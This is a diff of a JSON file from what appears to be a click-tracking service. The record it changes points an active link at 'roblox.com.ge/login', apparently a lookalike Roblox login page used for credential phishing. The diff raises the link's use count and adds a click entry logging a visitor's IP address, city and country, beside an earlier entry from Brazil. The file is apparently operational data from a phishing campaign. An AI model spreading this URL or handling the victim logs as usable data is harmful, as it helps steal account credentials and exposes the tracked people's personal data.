@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1340,
+    "useCount": 1341,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10888,6 +10888,14 @@
         "city": "Suzano",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777412186491,
+        "ip": "136.158.82.136",
+        "country": "Philippines",
+        "city": "Tanza",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
